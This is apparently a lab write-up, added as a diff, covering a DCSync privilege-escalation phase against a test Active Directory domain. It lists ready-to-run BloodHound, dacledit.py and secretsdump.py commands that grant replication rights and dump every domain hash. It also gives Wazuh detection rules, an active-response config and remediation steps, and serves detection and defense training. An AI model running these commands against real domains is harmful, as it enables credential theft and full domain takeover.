@@ -1,1 +1,119 @@
+# Phase 4 — Privilege Escalation via DCSync
 
+## Overview
+Using a WriteDACL misconfiguration on the domain object, svc-mssql 
+granted itself DCSync replication rights. This allowed the attacker 
+to dump all domain password hashes directly from DC01 without 
+touching the Domain Controller locally.
+
+## MITRE ATT&CK
+| Field | Value |
+|---|---|
+| Tactic | Privilege Escalation, Defense Evasion, Persistence |
+| Technique | T1078.002 — Domain Accounts |
+| Sub-technique | T1003.006 — DCSync |
+
+## Environment
+| Component | Details |
+|---|---|
+| Attacker | Kali Linux (10.0.0.99) |
+| Target | DC01 — Windows Server 2022 (10.0.0.10) |
+| Tools | Impacket dacledit.py, secretsdump.py |
+| Entry Point | svc-mssql credentials from Phase 2 |
+
+## Attack Chain
+```
+Phase 2: Kerberoasting → svc-mssql:Password1
+        ↓
+Phase 3: Pass-the-Hash → confirmed network access
+        ↓
+Phase 4: WriteDACL misconfiguration discovered via BloodHound
+        ↓
+dacledit.py → svc-mssql grants itself DCSync rights
+        ↓
+secretsdump.py → all domain hashes dumped
+        ↓
+Administrator hash obtained → Domain fully compromised
+```
+
+## Attack Steps
+
+### 1. Discover WriteDACL Misconfiguration via BloodHound
+```bash
+bloodhound-python -u svc-mssql -p 'Password1' \
+-d SOC.local -ns 10.0.0.10 -c ALL
+```
+Import JSON files → Analyze ACL paths → WriteDACL found on domain object
+
+### 2. Grant DCSync Rights via dacledit.py
+```bash
+python3 dacledit.py \
+-action write \
+-rights DCSync \
+-principal svc-mssql \
+-target-dn "DC=SOC,DC=local" \
+-dc-ip 10.0.0.10 \
+'SOC.local/svc-mssql:Password1'
+```
+Result: DACL modified successfully
+
+### 3. Execute DCSync Attack
+```bash
+python3 secretsdump.py \
+SOC.local/svc-mssql:'Password1'@10.0.0.10 \
+-just-dc-ntlm
+```
+Result: All domain hashes dumped including Administrator
+
+## Credentials Obtained
+| Account | Type |
+|---|---|
+| Administrator | Domain Admin |
+| krbtgt | Kerberos TGT account |
+| All domain users (User1-User20) | Domain users |
+
+## Evidence
+| File | Description |
+|---|---|
+| `Evidence/Screenshots/phase4-dacledit-success.png` | DCSync rights granted |
+| `Evidence/Screenshots/phase4-dcsync-success.png` | All hashes dumped |
+| `Evidence/Screenshots/phase4-wazuh-rule100031.png` | Wazuh detection |
+| `Evidence/Screenshots/phase4-bloodhound-path.png` | Attack path |
+
+## Detection
+| Source | Event ID | Indicator |
+|---|---|---|
+| Windows Security Log | 4662 | Replication rights used on domain object |
+| Wazuh Rule 100031 | level 15 | DCSync detected — T1078.002 |
+| Wazuh firedtimes | 53 | Repeated replication attempts |
+
+## Active Response
+```xml
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>100031</rules_id>
+  <timeout>600</timeout>
+</active-response>
+```
+
+### Known Limitation
+firewall-drop on Wazuh Manager running inside Docker requires 
+NET_ADMIN capability. Added to docker-compose.yml:
+```yaml
+cap_add:
+  - NET_ADMIN
+  - NET_RAW
+```
+In production, deploy a custom PowerShell active-response 
+script directly on DC01 for immediate account isolation.
+
+## Remediation
+| Action | Priority |
+|---|---|
+| Remove WriteDACL from service accounts | CRITICAL |
+| Monitor Event ID 4662 with replication GUIDs | CRITICAL |
+| Implement tiered admin model | HIGH |
+| Enable Protected Users Security Group | HIGH |
+| Regular ACL audits via BloodHound | HIGH |
+| Rotate krbtgt password immediately after detection | CRITICAL |
